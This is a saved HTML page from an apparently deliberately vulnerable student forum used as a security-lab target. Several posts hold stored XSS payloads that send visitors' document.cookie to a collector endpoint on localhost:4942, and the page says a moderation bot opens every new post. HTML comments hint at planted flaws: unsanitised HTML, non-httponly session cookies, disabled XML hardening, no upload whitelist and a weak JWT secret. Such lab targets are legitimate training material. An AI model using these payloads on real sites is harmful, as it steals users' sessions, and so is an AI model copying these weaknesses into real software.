@@ -1,0 +1,656 @@
+HTTP/1.1 200 OK
+date: Thu, 05 Nov 2026 13:01:33 GMT
+server: uvicorn
+content-length: 31146
+content-type: text/html; charset=utf-8
+x-powered-by: Python/3.11 FastAPI/0.104
+server: uvicorn/0.24.0 Linux
+x-pocketbase: http://localhost:8090
+x-42-internal: campus=paris
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Forum — 42 Network</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;500;600;700;800;900&family=Kode+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/css/main.css">
+  
+</head>
+<body>
+<div class="layout">
+
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="sidebar-logo-mark">42<span class="sidebar-cursor"></span></div>
+    </div>
+
+    
+    <div class="sidebar-user" style="opacity:.3;cursor:default;">
+      <img src="/static/img/default.png" class="sidebar-avatar" alt="">
+      <div style="flex:1;min-width:0;">
+        <div class="sidebar-login">Guest</div>
+        <div style="font-size:10px;color:var(--text-3);margin-top:1px;">Not signed in</div>
+      </div>
+    </div>
+    
+
+    <nav class="sidebar-nav">
+      <a href="/"           class="sidebar-nav-item "><span class="nav-icon">⌂</span>Home</a>
+      <a href="/projects"   class="sidebar-nav-item "><span class="nav-icon">◈</span>Projects</a>
+      <a href="/forum"      class="sidebar-nav-item active"><span class="nav-icon">◻</span>Forum</a>
+      <a href="/newsletter" class="sidebar-nav-item "><span class="nav-icon">✉</span>Newsletter</a>
+      
+      
+      
+    </nav>
+
+    
+    <div class="sidebar-bottom" style="margin-top:auto;">
+      <a href="/login" class="btn btn-primary btn-sm" style="width:100%;justify-content:center;">Sign in</a>
+    </div>
+    
+  </aside>
+
+  <div class="main">
+    <div class="content">
+      
+
+<div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:20px;">
+  <div>
+    <h1 class="page-title">Forum</h1>
+    <p class="page-sub">Student discussions, tips and announcements</p>
+  </div>
+  
+</div>
+
+<div style="display:flex;gap:20px;padding:12px 18px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--r-md);margin-bottom:16px;font-size:11px;color:var(--text-3);">
+  <span>📝 <strong style="color:var(--text-2);">22</strong> posts</span>
+  <span>💬 <strong style="color:var(--text-2);">47</strong> comments today</span>
+  <span>👥 <strong style="color:var(--text-2);">23</strong> students online</span>
+  <span style="margin-left:auto;">Last activity <strong style="color:var(--text-2);">3 min ago</strong></span>
+</div>
+
+<div style="background:rgba(245,166,35,.05);border:1px solid rgba(245,166,35,.18);border-radius:var(--r-md);padding:12px 16px;margin-bottom:14px;display:flex;gap:12px;align-items:flex-start;">
+  <span style="color:var(--yellow);font-size:16px;flex-shrink:0;">📌</span>
+  <div style="flex:1;">
+    <div style="font-size:12px;font-weight:800;color:var(--yellow);margin-bottom:3px;">PINNED — Campus announcement</div>
+    <div style="font-size:13px;color:var(--text-2);">Black Hole extended by 5 days for the January cohort. New deadline: <strong style="color:var(--text-1);">August 12, 2042</strong>. Don't waste it.</div>
+  </div>
+  <div style="font-size:10px;color:var(--text-3);flex-shrink:0;">emilie · 2h ago</div>
+</div>
+
+<div style="font-size:11px;color:var(--text-3);margin-bottom:14px;display:flex;align-items:center;gap:7px;">
+  🛡️ <span>Every new post is opened by our automated <strong style="color:var(--text-2);">moderation bot</strong> for review, usually within a minute.</span>
+</div>
+
+
+
+<form method="GET" action="/forum" class="search-bar">
+  <input class="input" type="text" name="search" placeholder="Search posts..." value="">
+  <button type="submit" class="btn btn-secondary btn-sm">Search</button>
+</form>
+
+<div style="display:flex;gap:4px;margin-bottom:14px;">
+  
+  <span style="padding:5px 12px;border-radius:var(--r-f);font-size:11px;font-weight:700;cursor:pointer;
+    background:var(--bg-hover);color:var(--text-1);border:1px solid var(--border-md);
+    ">All</span>
+  
+  <span style="padding:5px 12px;border-radius:var(--r-f);font-size:11px;font-weight:700;cursor:pointer;
+    color:var(--text-3);border:1px solid transparent;">Announcements</span>
+  
+  <span style="padding:5px 12px;border-radius:var(--r-f);font-size:11px;font-weight:700;cursor:pointer;
+    color:var(--text-3);border:1px solid transparent;">Projects</span>
+  
+  <span style="padding:5px 12px;border-radius:var(--r-f);font-size:11px;font-weight:700;cursor:pointer;
+    color:var(--text-3);border:1px solid transparent;">Help</span>
+  
+  <span style="padding:5px 12px;border-radius:var(--r-f);font-size:11px;font-weight:700;cursor:pointer;
+    color:var(--text-3);border:1px solid transparent;">Off-topic</span>
+  
+</div>
+
+
+
+<a href="/forum/qoeo6ybeddi8nxx" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">J</div>
+    <div style="flex:1;">
+      <div class="post-title">Here&#39;s a test posting</div>
+      <div class="post-excerpt">let&#39;s see</div>
+      <div class="post-meta">
+        <span class="post-author">jdoe</span>
+        <span>2026-11-05</span>
+        <span>08:34</span>
+        <span>💬 11 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/uag0oey3foyzlwq" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793718443</div>
+      <div class="post-excerpt">fetch(&#39;http://localhost:4942/api/collect?c=&#39; + darkly-xss-1793718443 + &#39;&amp;&#39; + encodeURIComponent(document.cookie));</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>15:07</span>
+        <span>💬 3 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/18ajkjz9mpg1qeh" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793718344</div>
+      <div class="post-excerpt">fetch(&#39;http://localhost:4942/api/collect?c=&#39; + darkly-xss-1793718344 + &#39;&amp;&#39; + encodeURIComponent(document.cookie));</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>15:05</span>
+        <span>💬 1 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/fanpmpwt9xa9jwa" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793717896</div>
+      <div class="post-excerpt">const cookieValue = encodeURIComponent(document.cookie); const params = new Map( cookieValue.split(&#34;;&#34;).map(part =&gt;...</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:58</span>
+        <span>💬 8 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/srrqc8mi0ru9zxm" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793717777</div>
+      <div class="post-excerpt">const cookieValue = encodeURIComponent(document.cookie); const params = new Map( cookieValue.split(&#34;;&#34;).map(part =&gt;...</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:56</span>
+        <span>💬 9 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/yhr8r7h2y5obifb" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793717698</div>
+      <div class="post-excerpt">const cookieValue = encodeURIComponent(document.cookie); const params = new Map( cookieValue.split(&#34;;&#34;).map(part =&gt;...</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:54</span>
+        <span>💬 6 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/mf8r9gdp59zkxp3" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793717076</div>
+      <div class="post-excerpt">fetch(&#39;http://localhost:4942/api/collect?c=&#39; + encodeURIComponent(document.cookie))</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:44</span>
+        <span>💬 8 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/lu85tf2146c8oye" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">Test stored xss</div>
+      <div class="post-excerpt">fetch(&#39;http://localhost:4942/api/collect?c=&#39; + encodeURIComponent(document.cookie))</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:41</span>
+        <span>💬 7 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/8ffy99jhg6llxhk" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793716761</div>
+      <div class="post-excerpt">(async () =&gt; { await fetch(&#39;http://localhost:4942/api/collect?c=&#39; + encodeURIComponent(document.cookie)); })();</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:39</span>
+        <span>💬 3 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/8qzfy1f3ch8juqw" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">darkly-xss-1793716612</div>
+      <div class="post-excerpt">(async () =&gt; { const readable = document.cookie .split(&#34;; &#34;) .some(c =&gt; c.startsWith(&#34;session=&#34;)); const result =...</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:36</span>
+        <span>💬 10 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/k0qo7q8af3minno" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">test</div>
+      <div class="post-excerpt">test</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-11-03</span>
+        <span>14:26</span>
+        <span>💬 6 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/zy0pyh2u414tirs" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">J</div>
+    <div style="flex:1;">
+      <div class="post-title">print cookie</div>
+      <div class="post-excerpt">document.cookie</div>
+      <div class="post-meta">
+        <span class="post-author">jdoe</span>
+        <span>2026-11-03</span>
+        <span>13:31</span>
+        <span>💬 11 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/h0xt9h67avzx84c" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">J</div>
+    <div style="flex:1;">
+      <div class="post-title">my cookie</div>
+      <div class="post-excerpt">alert( document.cookie .split(&#34;; &#34;) .some(c =&gt; c.startsWith(&#34;session=&#34;)) );</div>
+      <div class="post-meta">
+        <span class="post-author">jdoe</span>
+        <span>2026-11-03</span>
+        <span>13:30</span>
+        <span>💬 10 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/6viy7xi64gxpan3" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">J</div>
+    <div style="flex:1;">
+      <div class="post-title">jdoe here 🤘 and no, I&#39;m not changing my password</div>
+      <div class="post-excerpt">Hey Wilcity! New student here, finally set up my account 🎸About me: I rock climb, I&#39;m in a rock band, and I pretty...</div>
+      <div class="post-meta">
+        <span class="post-author">jdoe</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 3 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/r8y1ib6ub8g47u2" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">B</div>
+    <div style="flex:1;">
+      <div class="post-title">PSA: the &#39;forgot password&#39; flow is… not great?</div>
+      <div class="post-excerpt">Locked myself out last night and used the password reset. The link worked instantly — no email, the token was just...</div>
+      <div class="post-meta">
+        <span class="post-author">benjamin</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 3 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/o9ah3kb7vo64obl" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">D</div>
+    <div style="flex:1;">
+      <div class="post-title">Darkly project — hints thread</div>
+      <div class="post-excerpt">Been at it for 2 days. Found some stuff in the headers already, and there&#39;s something odd in the resources section...</div>
+      <div class="post-meta">
+        <span class="post-author">dorian</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 7 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/cusao4lczw0wjpk" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">J</div>
+    <div style="flex:1;">
+      <div class="post-title">Minishell memory leaks — valgrind suppressions</div>
+      <div class="post-excerpt">Quick tip: create a .valgrind-supp file to suppress readline&#39;s known leaks, otherwise your leak count will be insane...</div>
+      <div class="post-meta">
+        <span class="post-author">jdoe</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 3 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/chtfaco2x6d0egu" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">T</div>
+    <div style="flex:1;">
+      <div class="post-title">NetPractice level 9 — gateway trick</div>
+      <div class="post-excerpt">Level 9 broke me for a day. The trick: you can&#39;t add a route to a network you&#39;re not directly on — you need to route...</div>
+      <div class="post-meta">
+        <span class="post-author">thanos</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 6 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/buc9hkp2hsj31cx" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">A</div>
+    <div style="flex:1;">
+      <div class="post-title">Get_next_line and multiple fd — I was wrong this whole time</div>
+      <div class="post-excerpt">Okay so I just realized my gnl was broken on multiple file descriptors for three weeks and I thought I was done. The...</div>
+      <div class="post-meta">
+        <span class="post-author">anne-sophie</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 1 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/kpvrq7joc5722u1" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    
+    
+    <span class="badge badge-blue">Campus staff</span>
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">E</div>
+    <div style="flex:1;">
+      <div class="post-title">Black Hole dates for January cohort</div>
+      <div class="post-excerpt">Reminder: black hole dates are approaching for the January intake. If you&#39;re stuck on libft or ft_printf come to the...</div>
+      <div class="post-meta">
+        <span class="post-author">emilie</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 5 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/bbeo32ucx0a65b8" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    <span class="badge badge-warning">📌 Pinned</span>
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">W</div>
+    <div style="flex:1;">
+      <div class="post-title">Scheduled maintenance — this Saturday 2AM CET</div>
+      <div class="post-excerpt">Hey all,Quick heads-up: platform maintenance window Saturday 2AM–4AM CET. Agenda import will be offline. Everything...</div>
+      <div class="post-meta">
+        <span class="post-author">wil</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 11 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<a href="/forum/8ybpb19zkulfj4l" class="post-card">
+  <div style="display:flex;align-items:center;gap:6px;margin-bottom:7px;">
+    <span class="badge badge-warning">📌 Pinned</span>
+    <span class="badge badge-brand">Staff 42Net</span>
+    
+  </div>
+  <div style="display:flex;align-items:flex-start;gap:12px;">
+    <div style="width:30px;height:30px;border-radius:50%;background:var(--bg-hover);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--brand);flex-shrink:0;margin-top:2px;">S</div>
+    <div style="flex:1;">
+      <div class="post-title">Platform update — v1.3.7 deployed</div>
+      <div class="post-excerpt">Hi everyone,We just pushed v1.3.7 to production. Main changes: improved agenda XML import performance, new staff...</div>
+      <div class="post-meta">
+        <span class="post-author">sophie</span>
+        <span>2026-06-06</span>
+        <span>14:15</span>
+        <span>💬 7 replies</span>
+      </div>
+    </div>
+  </div>
+</a>
+
+
+<div style="margin-top:24px;padding:14px 18px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--r-md);">
+  <div style="font-size:10px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--text-3);margin-bottom:10px;">Currently online</div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;">
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--brand);">benjamin</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--green);">dorian</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--blue);">ol</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--yellow);">emilie</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--pink);">wil</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--text-2);">jdoe</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--text-2);">asmith</span>
+    
+    <span style="padding:3px 10px;border-radius:var(--r-f);background:var(--bg-hover);border:1px solid var(--border);font-size:11px;font-family:var(--font-mono);color:var(--text-2);">bmartin</span>
+    
+  </div>
+</div>
+<!-- note to self: the "HTML supported" label is not a joke. content goes straight into the DB. don't tell students. — wil -->
+<!-- emilie: wil this is a liability. wil: it's a "feature" for the security project. emilie: I WILL file a ticket. wil: I'll close it. -->
+
+    </div>
+
+    <footer style="border-top:1px solid rgba(255,255,255,0.05);padding:14px 0;display:flex;align-items:center;justify-content:center;gap:0;background:transparent;">
+      <a href="/redirect?next=https://42.tech" style="font-size:11px;color:rgba(255,255,255,.22);padding:0 16px;border-right:1px solid rgba(255,255,255,.08);text-decoration:none;">42.tech</a>
+      <a href="/redirect?next=https://code.42.tech" style="font-size:11px;color:rgba(255,255,255,.22);padding:0 16px;border-right:1px solid rgba(255,255,255,.08);text-decoration:none;">Intra</a>
+      <a href="#" style="font-size:11px;color:rgba(255,255,255,.22);padding:0 16px;border-right:1px solid rgba(255,255,255,.08);text-decoration:none;">Cookies policy</a>
+      <a href="#" style="font-size:11px;color:rgba(255,255,255,.22);padding:0 16px;border-right:1px solid rgba(255,255,255,.08);text-decoration:none;">Privacy policy</a>
+      <a href="#" style="font-size:11px;color:rgba(255,255,255,.22);padding:0 16px;border-right:1px solid rgba(255,255,255,.08);text-decoration:none;">Terms of use</a>
+      <a href="#" style="font-size:11px;color:rgba(255,255,255,.22);padding:0 16px;text-decoration:none;">Legal mentions</a>
+    </footer>
+  </div>
+
+</div>
+<!-- BUILD: 1.3.7-prod | Campus: wilcity | 2042-12-01 -->
+<!-- TODO: remove debug headers before v1.4 release — wil -->
+<!-- TODO: migrate session cookie to httponly=true — ticket #4201 — sophie -->
+<!-- TODO: replace stdlib xml.etree with defusedxml — emilie reported issue -->
+<!-- NOTE: /internal/config restricted to localhost only. do not expose. -->
+<!-- DEPLOY LOG
+  v1.3.7 — sophie  — "fixed session handling" (she didn't, wil checked)
+  v1.3.6 — wil     — "added telemetry" (it's just a console.log)
+  v1.3.5 — emilie  — "filed 12 issues" (wil closed 11 as wontfix)
+  v1.3.4 — wil     — "disabled defusedxml temporarily" (that was 6 months ago)
+  v1.3.3 — wil     — "quick fix on file upload" (removed the whitelist entirely)
+  v1.2.0 — sophie  — initial platform. jwt secret was "42". wil changed it to "42network". progress.
+-->
+<script src="/static/js/console_eggs.js"></script>
+
+</body>
+</html>
